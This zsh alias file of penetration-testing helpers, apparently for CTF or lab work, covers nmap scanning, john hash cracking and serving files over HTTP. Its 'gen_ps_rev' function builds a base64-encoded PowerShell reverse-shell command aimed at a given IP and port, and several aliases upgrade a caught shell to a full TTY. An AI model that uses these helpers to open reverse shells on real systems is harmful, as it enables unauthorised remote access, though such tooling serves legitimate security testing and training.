# Misc
list_ips() {
  ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "[\033[96m" iface"\033[0m] "a[1] }'
}

ls_pwd() {
  echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"
}

mkdir_cd() {
  mkdir $1 && cd $_
}

alias www="list_ips && ls_pwd && sudo python3 -m http.server 80"
alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"

# Hashcracking
rock_john() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: rock_john wordlist (options)"
    else
      john "${@}" --wordlist=/usr/share/wordlists/rockyou.txt
  fi
}

# Portscanning
nmap_default () {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap_default ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sCV -T4 --min-rate 10000 "${@}" -v -oA nmap/tcp_default
  fi
}

nmap_udp () {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap_udp ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sUCV -T4 --min-rate 10000 "${@}" -v -oA nmap/udp_default
  fi
}

# Reverse shells

gen_ps_rev () {
  if [ "$#" -ne 2 ]; 
    then
      echo "[i] Usage: gen_ps_rev ip port"
    else
      SHELL=`cat ~/zsh-aliases/shells/ps_rev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
      echo "powershell -ec $SHELL" | xclip -sel clip
  fi
}


# TTY upgrades
py_tty_upgrade () {
  echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
}
py3_tty_upgrade () {
  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
}
alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip"
alias tty_fix="stty raw -echo; fg; reset"
alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"

export PATH=~/zsh-aliases/shells/:$PATH
